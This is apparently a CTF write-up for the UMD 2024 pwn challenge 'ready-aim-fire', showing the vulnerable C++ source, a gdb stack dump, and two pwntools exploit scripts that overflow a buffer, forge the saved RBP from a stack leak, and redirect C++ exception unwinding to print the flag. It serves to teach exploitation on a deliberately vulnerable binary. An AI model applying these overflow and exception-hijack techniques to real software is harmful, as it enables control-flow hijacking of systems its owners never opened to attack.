---
title: ready-aim-fire
date: 2024-04-26T14:23:28+03:00
description: Writeup for ready-aim-fire [UMD 2024]
author: PineBel
tags:
  - pwn
draft: false
---
## Challenge Description

Firing your weapon when the spice harvester's shields are down requires exceptional timing.

### Intuition
This was a fun challenge which I solved in an unintended way, I will also present the intended solution because it's very interesting. 
We get the source code (and binary) for this challenge and we can see that we have a BOF in the fire method from the Cannon object and we also have a stack leak.

```C
void print_flag() {
    ifstream f{"./flag.txt"};
    if (!f.is_open()) {
        cout << "Failed to open flag file. Contact CTF organizers if you see this error." << endl;
    } else {
        string flag;
        f >> flag;
        cout << flag << endl;
    }
}


void direct_hit() {
    try {
        throw exception{};
    } catch (exception e) {
        cout << "Direct hit!" << endl;
        print_flag();
    }
}

class Cannon {
public:
    int bufIndex;
    char buf[32];

    Cannon(): bufIndex(0) {}

    void fire() {
        char c ;
        for (;;) {      
            cin.get(c);   
            if (c == '\n') {
                break;
            } else {
                buf[bufIndex++] = c;  // <-- overflow     
            }
        }
        if (bufIndex >= 32) {
            throw out_of_range{""};
        }
    }
};

void fire_weapon() {
    Cannon w;
    w.fire();
}

int main() {
    int target_assist;
    cout << "Quick! While the spice harvester's shields are down! Fire the laser cannon!" << endl;
    cout << &target_assist << endl;  // <-- stack leak 

    try {
        fire_weapon();
        cout << "Looks like you missed your opportunity to fire." << endl;
    }
    catch (exception e) {
        cout << "Seems like you missed." << endl;
    }
}
```

We can see that there is a constraint though, if we do a BOF, it will trigger an exception, which will be caught in the main function. Additionally, I noticed an extra function called 'direct_hit,' which suggested that we should attempt to redirect the exception thrown during a BOF into the catch block of 'direct_hit()' to print the flag (the intended solution). Unfortunately, my implementation didn't work as expected. Therefore, my next idea was to overwrite the return address of the main function with the address of 'print_flag()' after the exception was triggered.

### Solution

#### Unintended

When first trying to do the BOF with an input of length 33 the program crashed in the exception handler and printed "Seems like you missed.". 
If we give an input longer than 44 we will start overwriting the RBP and the program will crash. 
This happens because we don't return in a 'normal' way to main but through exception throwing.

We can see in the image below that the RBP value is used in the exception handler, which is called when the bufferIndex is greater than 32 (input: "A"*44 + "X"*8).

```c
0x00007ffd8a60ad20│+0x0000: "XXXXXXXX+'@"        ← $rsp, $rbp   <-- crash  
0x00007ffd8a60ad28│+0x0008: 0x000000000040272b  →  <main+270> mov rax, rbx  
0x00007ffd8a60ad30│+0x0010: 0x004023e630303030
0x00007ffd8a60ad38│+0x0018: 0x004023e600000000
0x00007ffd8a60ad40│+0x0020: 0x004023e600000000
0x00007ffd8a60ad48│+0x0028: 0x004023e600000000
0x00007ffd8a60ad50│+0x0030: 0x004023e600000000
0x00007ffd8a60ad58│+0x0038: 0x004023e600000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40283a <std::exception::exception(std::exception const&)+12> mov    QWORD PTR [rbp-0x10], rsi
     0x40283e <std::exception::exception(std::exception const&)+16> lea    rdx, [rip+0x255b]        # 0x404da0 <_ZTVSt9exception@GLIBCXX_3.4+16>
     0x402845 <std::exception::exception(std::exception const&)+23> mov    rax, QWORD PTR [rbp-0x8]
●→   0x402849 <std::exception::exception(std::exception const&)+27> mov    QWORD PTR [rax], rdx
     0x40284c <std::exception::exception(std::exception const&)+30> nop    
     0x40284d <std::exception::exception(std::exception const&)+31> pop    rbp
     0x40284e <std::exception::exception(std::exception const&)+32> ret    
     0x40284f                  nop    
     0x402850 <Cannon::Cannon()+0> endbr64 

```

To address this issue, we need a valid address for RBP after our input of length 44. This address can be the stack leak we get.

Because the stack leak address and the address where RBP is used are very close, we need to add an offset to avoid interfering with the stack when executing future instructions. Therefore, I subtracted 0x10 from the stack leak address.

The goal here is to make the exception execute normally so that we return to main and overwrite the return address of main. 
To achieve this, I needed to replicate the stack.

So I extended the payload with an address that was normally on the stack (this was found by running the program with gdb),
ensuring that the exception would execute smoothly and return in the the main function.
To complete the exploit, I added the address of the print_flag function to the end of the payload. 


```py
payload = b"a"*44 


print_flag = p64(0x4023e6) 
og_main = p64(0x4026be) # replicate stack 
 

target.recvuntil(b"Fire the laser cannon!")
recvline = target.recvline()
print(recvline)

stack_leak = target.recvline()
print(hex(int(stack_leak.decode(),16)))
stack_leak = p64((int(stack_leak.decode(),16))-0x10) 

payload += stack_leak 

payload += og_main   
payload += b"0000"+print_flag 
target.sendline(payload)
target.interactive()
```

Although I like this solution the intended one is more elegant.

#### Intended

The intended solution is similar to the unintended one but the main idea is to just overwrite the exception catch from fire() to the one from direct_hit().

```py
target  .recvuntil(b"Fire the laser cannon!")
recvline =  target.recvline()
stack_leak =  target.recvline()
stack_leak = p64((int(stack_leak.decode(),16))-0x10)
payload += stack_leak 
payload += p64(0x402547) # catch from direct_hit
target.sendline(payload)
```

Some other interesting things about the exception handler is that it works stack frame by stack frame. When an exception is thrown the current RIP searches in the .eh_frame section if it's in a catch block in that function. If it's found then it will jump to the catch block otherwise it will unwind the stack to clean it. After this it uses the stored return address to repeat this process on the next stack frame and comparing it to the .eh_frame table. The process goes on until either the exception is caught or it reaches the base exception handler.





